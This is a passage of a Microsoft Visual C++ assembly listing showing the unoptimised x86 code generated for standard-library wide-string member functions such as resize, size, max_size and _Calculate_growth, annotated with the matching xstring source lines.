  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4890 :         return _Mypair._Get_first();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAEAAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4891 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXAAV12@@Z
_TEXT	SEGMENT
tv79 = -8						; size = 4
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXAAV12@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators, COMDAT
; _this$ = ecx

; 4885 :     _CONSTEXPR20 void _Swap_proxy_and_iterators(basic_string& _Right) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4886 :         _Mypair._Myval2._Swap_proxy_and_iterators(_Right._Mypair._Myval2);

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR tv79[ebp], eax
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00012	51		 push	 ecx
  00013	8b 4d f8	 mov	 ecx, DWORD PTR tv79[ebp]
  00016	e8 00 00 00 00	 call	 ?_Swap_proxy_and_iterators@_Container_base0@std@@QAEXAAU12@@Z ; std::_Container_base0::_Swap_proxy_and_iterators

; 4887 :     }

  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c2 04 00	 ret	 4
?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXAAV12@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Orphan_all@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Orphan_all@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Orphan_all, COMDAT
; _this$ = ecx

; 4880 :     _CONSTEXPR20 void _Orphan_all() noexcept { // used by filesystem::path

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4881 :         _Mypair._Myval2._Orphan_all();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 4882 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
?_Orphan_all@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Orphan_all
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXXZ
_TEXT	SEGMENT
__Al$1 = -16						; size = 4
_this$ = -12						; size = 4
__My_data$ = -8						; size = 4
$T2 = -2						; size = 2
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate, COMDAT
; _this$ = ecx

; 4863 :     _CONSTEXPR20 void _Tidy_deallocate() noexcept { // initialize buffer, deallocating any storage

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 4864 :         auto& _My_data = _Mypair._Myval2;

  00009	8b 45 f4	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR __My_data$[ebp], eax

; 4865 :         _My_data._Orphan_all();

  0000f	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00012	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00017	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0001a	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBE_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  0001f	0f b6 c8	 movzx	 ecx, al
  00022	85 c9		 test	 ecx, ecx
  00024	74 2c		 je	 SHORT $LN2@Tidy_deall

; 4867 :             _ASAN_STRING_REMOVE(*this);
; 4868 :             auto& _Al = _Getal();

  00026	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00029	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  0002e	89 45 f0	 mov	 DWORD PTR __Al$1[ebp], eax

; 4869 :             _Deallocate_for_capacity(_Al, _My_data._Bx._Ptr, _My_data._Myres);

  00031	8b 55 f8	 mov	 edx, DWORD PTR __My_data$[ebp]
  00034	8b 42 14	 mov	 eax, DWORD PTR [edx+20]
  00037	50		 push	 eax
  00038	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0003b	8b 11		 mov	 edx, DWORD PTR [ecx]
  0003d	52		 push	 edx
  0003e	8b 45 f0	 mov	 eax, DWORD PTR __Al$1[ebp]
  00041	50		 push	 eax
  00042	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAAV?$allocator@_W@2@QA_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
  00047	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4870 :             _My_data._Bx._Switch_to_buf();

  0004a	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0004d	e8 00 00 00 00	 call	 ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
$LN2@Tidy_deall:

; 4871 :         }
; 4872 : 
; 4873 :         _My_data._Mysize = 0;

  00052	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00055	c7 41 10 00 00
	00 00		 mov	 DWORD PTR [ecx+16], 0

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  0005c	8b 55 f8	 mov	 edx, DWORD PTR __My_data$[ebp]
  0005f	c7 42 14 07 00
	00 00		 mov	 DWORD PTR [edx+20], 7

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00066	33 c0		 xor	 eax, eax
  00068	66 89 45 fe	 mov	 WORD PTR $T2[ebp], ax
  0006c	8d 4d fe	 lea	 ecx, DWORD PTR $T2[ebp]
  0006f	51		 push	 ecx
  00070	ba 02 00 00 00	 mov	 edx, 2
  00075	6b c2 00	 imul	 eax, edx, 0
  00078	03 45 f8	 add	 eax, DWORD PTR __My_data$[ebp]
  0007b	50		 push	 eax
  0007c	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  00081	83 c4 08	 add	 esp, 8

; 4877 :     }

  00084	8b e5		 mov	 esp, ebp
  00086	5d		 pop	 ebp
  00087	c3		 ret	 0
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Eos@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXI@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -2						; size = 2
__New_size$ = 8						; size = 4
?_Eos@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXI@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Eos, COMDAT
; _this$ = ecx

; 4857 :     _CONSTEXPR20 void _Eos(const size_type _New_size) noexcept { // set new length and null terminator

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4858 :         _ASAN_STRING_MODIFY(*this, _Mypair._Myval2._Mysize, _New_size);
; 4859 :         _Mypair._Myval2._Mysize = _New_size;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 4d 08	 mov	 ecx, DWORD PTR __New_size$[ebp]
  0000f	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 4860 :         _Traits::assign(_Mypair._Myval2._Myptr()[_New_size], _Elem());

  00012	33 d2		 xor	 edx, edx
  00014	66 89 55 fe	 mov	 WORD PTR $T1[ebp], dx
  00018	8d 45 fe	 lea	 eax, DWORD PTR $T1[ebp]
  0001b	50		 push	 eax
  0001c	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0001f	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEPA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  00024	8b 4d 08	 mov	 ecx, DWORD PTR __New_size$[ebp]
  00027	8d 14 48	 lea	 edx, DWORD PTR [eax+ecx*2]
  0002a	52		 push	 edx
  0002b	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  00030	83 c4 08	 add	 esp, 8

; 4861 :     }

  00033	8b e5		 mov	 esp, ebp
  00035	5d		 pop	 ebp
  00036	c2 04 00	 ret	 4
?_Eos@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXI@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Eos
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEII@Z
_TEXT	SEGMENT
tv74 = -12						; size = 4
tv76 = -8						; size = 4
_this$ = -4						; size = 4
__Requested$ = 8					; size = 4
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEII@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT
; _this$ = ecx

; 4773 :     _NODISCARD _CONSTEXPR20 size_type _Calculate_growth(const size_type _Requested) const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4774 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00011	89 45 f8	 mov	 DWORD PTR tv76[ebp], eax
  00014	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00017	8b 48 14	 mov	 ecx, DWORD PTR [eax+20]
  0001a	89 4d f4	 mov	 DWORD PTR tv74[ebp], ecx
  0001d	8b 55 f8	 mov	 edx, DWORD PTR tv76[ebp]
  00020	52		 push	 edx
  00021	8b 45 f4	 mov	 eax, DWORD PTR tv74[ebp]
  00024	50		 push	 eax
  00025	8b 4d 08	 mov	 ecx, DWORD PTR __Requested$[ebp]
  00028	51		 push	 ecx
  00029	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAIIII@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  0002e	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4775 :     }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c2 04 00	 ret	 4
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEII@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAIIII@Z
_TEXT	SEGMENT
$T1 = -8						; size = 4
__Masked$ = -4						; size = 4
__Requested$ = 8					; size = 4
__Old$ = 12						; size = 4
__Max$ = 16						; size = 4
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAIIII@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4760 :         const size_type _Requested, const size_type _Old, const size_type _Max) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00006	8b 45 08	 mov	 eax, DWORD PTR __Requested$[ebp]
  00009	83 c8 07	 or	 eax, 7
  0000c	89 45 fc	 mov	 DWORD PTR __Masked$[ebp], eax

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR __Masked$[ebp]
  00012	3b 4d 10	 cmp	 ecx, DWORD PTR __Max$[ebp]
  00015	76 05		 jbe	 SHORT $LN2@Calculate_

; 4763 :             return _Max;

  00017	8b 45 10	 mov	 eax, DWORD PTR __Max$[ebp]
  0001a	eb 31		 jmp	 SHORT $LN1@Calculate_
$LN2@Calculate_:

; 4764 :         }
; 4765 : 
; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

  0001c	8b 55 0c	 mov	 edx, DWORD PTR __Old$[ebp]
  0001f	d1 ea		 shr	 edx, 1
  00021	8b 45 10	 mov	 eax, DWORD PTR __Max$[ebp]
  00024	2b c2		 sub	 eax, edx
  00026	39 45 0c	 cmp	 DWORD PTR __Old$[ebp], eax
  00029	76 05		 jbe	 SHORT $LN3@Calculate_

; 4767 :             return _Max;

  0002b	8b 45 10	 mov	 eax, DWORD PTR __Max$[ebp]
  0002e	eb 1d		 jmp	 SHORT $LN1@Calculate_
$LN3@Calculate_:

; 4768 :         }
; 4769 : 
; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  00030	8b 4d 0c	 mov	 ecx, DWORD PTR __Old$[ebp]
  00033	d1 e9		 shr	 ecx, 1
  00035	03 4d 0c	 add	 ecx, DWORD PTR __Old$[ebp]
  00038	89 4d f8	 mov	 DWORD PTR $T1[ebp], ecx
  0003b	8d 55 f8	 lea	 edx, DWORD PTR $T1[ebp]
  0003e	52		 push	 edx
  0003f	8d 45 fc	 lea	 eax, DWORD PTR __Masked$[ebp]
  00042	50		 push	 eax
  00043	e8 00 00 00 00	 call	 ??$max@I@std@@YAABIABI0@Z ; std::max<unsigned int>
  00048	83 c4 08	 add	 esp, 8
  0004b	8b 00		 mov	 eax, DWORD PTR [eax]
$LN1@Calculate_:

; 4771 :     }

  0004d	8b e5		 mov	 esp, ebp
  0004f	5d		 pop	 ebp
  00050	c3		 ret	 0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAIIII@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?resize@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEXI_W@Z
_TEXT	SEGMENT
__Old_size$ = -8					; size = 4
_this$ = -4						; size = 4
__New_size$ = 8						; size = 4
__Ch$ = 12						; size = 2
?resize@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEXI_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::resize, COMDAT
; _this$ = ecx

; 4174 :     _CONSTEXPR20 void resize(_CRT_GUARDOVERFLOW const size_type _New_size, const _Elem _Ch = _Elem()) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4175 :         // determine new length, padding with _Ch elements as needed
; 4176 :         const size_type _Old_size = size();

  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
  00011	89 45 f8	 mov	 DWORD PTR __Old_size$[ebp], eax

; 4177 :         if (_New_size <= _Old_size) {

  00014	8b 45 08	 mov	 eax, DWORD PTR __New_size$[ebp]
  00017	3b 45 f8	 cmp	 eax, DWORD PTR __Old_size$[ebp]
  0001a	77 0e		 ja	 SHORT $LN2@resize

; 4178 :             _Eos(_New_size);

  0001c	8b 4d 08	 mov	 ecx, DWORD PTR __New_size$[ebp]
  0001f	51		 push	 ecx
  00020	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00023	e8 00 00 00 00	 call	 ?_Eos@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Eos

; 4179 :         } else {

  00028	eb 14		 jmp	 SHORT $LN3@resize
$LN2@resize:

; 4180 :             append(_New_size - _Old_size, _Ch);

  0002a	0f b7 55 0c	 movzx	 edx, WORD PTR __Ch$[ebp]
  0002e	52		 push	 edx
  0002f	8b 45 08	 mov	 eax, DWORD PTR __New_size$[ebp]
  00032	2b 45 f8	 sub	 eax, DWORD PTR __Old_size$[ebp]
  00035	50		 push	 eax
  00036	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00039	e8 00 00 00 00	 call	 ?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@I_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
$LN3@resize:

; 4181 :         }
; 4182 :     }

  0003e	8b e5		 mov	 esp, ebp
  00040	5d		 pop	 ebp
  00041	c2 08 00	 ret	 8
?resize@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEXI_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::resize
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ
_TEXT	SEGMENT
$T1 = -24						; size = 4
$T2 = -20						; size = 4
__Storage_max$ = -16					; size = 4
__Alloc_max$ = -12					; size = 4
$T3 = -8						; size = 4
_this$ = -4						; size = 4
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size, COMDAT
; _this$ = ecx

; 4165 :     _NODISCARD _CONSTEXPR20 size_type max_size() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 18	 sub	 esp, 24			; 00000018H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4166 :         const size_type _Alloc_max   = _Alty_traits::max_size(_Getal());

  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEABV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00011	50		 push	 eax
  00012	e8 00 00 00 00	 call	 ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAIABV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
  00017	83 c4 04	 add	 esp, 4
  0001a	89 45 f4	 mov	 DWORD PTR __Alloc_max$[ebp], eax

; 4167 :         const size_type _Storage_max = // can always store small string

  0001d	c7 45 f8 08 00
	00 00		 mov	 DWORD PTR $T3[ebp], 8
  00024	8d 45 f8	 lea	 eax, DWORD PTR $T3[ebp]
  00027	50		 push	 eax
  00028	8d 4d f4	 lea	 ecx, DWORD PTR __Alloc_max$[ebp]
  0002b	51		 push	 ecx
  0002c	e8 00 00 00 00	 call	 ??$max@I@std@@YAABIABI0@Z ; std::max<unsigned int>
  00031	83 c4 08	 add	 esp, 8
  00034	8b 10		 mov	 edx, DWORD PTR [eax]
  00036	89 55 f0	 mov	 DWORD PTR __Storage_max$[ebp], edx

; 4168 :             (_STD max)(_Alloc_max, static_cast<size_type>(_BUF_SIZE));
; 4169 :         return (_STD min)(static_cast<size_type>((numeric_limits<difference_type>::max)()),

  00039	8b 45 f0	 mov	 eax, DWORD PTR __Storage_max$[ebp]
  0003c	83 e8 01	 sub	 eax, 1
  0003f	89 45 ec	 mov	 DWORD PTR $T2[ebp], eax
  00042	e8 00 00 00 00	 call	 ?max@?$numeric_limits@H@std@@SAHXZ ; std::numeric_limits<int>::max
  00047	89 45 e8	 mov	 DWORD PTR $T1[ebp], eax
  0004a	8d 4d ec	 lea	 ecx, DWORD PTR $T2[ebp]
  0004d	51		 push	 ecx
  0004e	8d 55 e8	 lea	 edx, DWORD PTR $T1[ebp]
  00051	52		 push	 edx
  00052	e8 00 00 00 00	 call	 ??$min@I@std@@YAABIABI0@Z ; std::min<unsigned int>
  00057	83 c4 08	 add	 esp, 8
  0005a	8b 00		 mov	 eax, DWORD PTR [eax]

; 4170 :             _Storage_max - 1 // -1 is for null terminator and/or npos
; 4171 :         );
; 4172 :     }

  0005c	8b e5		 mov	 esp, ebp
  0005e	5d		 pop	 ebp
  0005f	c3		 ret	 0
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size, COMDAT
; _this$ = ecx

; 4161 :     _NODISCARD _CONSTEXPR20 size_type size() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4162 :         return _Mypair._Myval2._Mysize;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 40 10	 mov	 eax, DWORD PTR [eax+16]

; 4163 :     }

  0000d	8b e5		 mov	 esp, ebp
  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEPA_WXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEPA_WXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data, COMDAT
; _this$ = ecx

; 4152 :     _NODISCARD _CONSTEXPR20 _Ret_z_ _Elem* data() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4153 :         return _Mypair._Myval2._Myptr();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEPA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr

; 4154 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEPA_WXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data, COMDAT
; _this$ = ecx

; 4147 :     _NODISCARD _CONSTEXPR20 _Ret_z_ const _Elem* data() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4148 :         return _Mypair._Myval2._Myptr();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QBEPB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr

; 4149 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
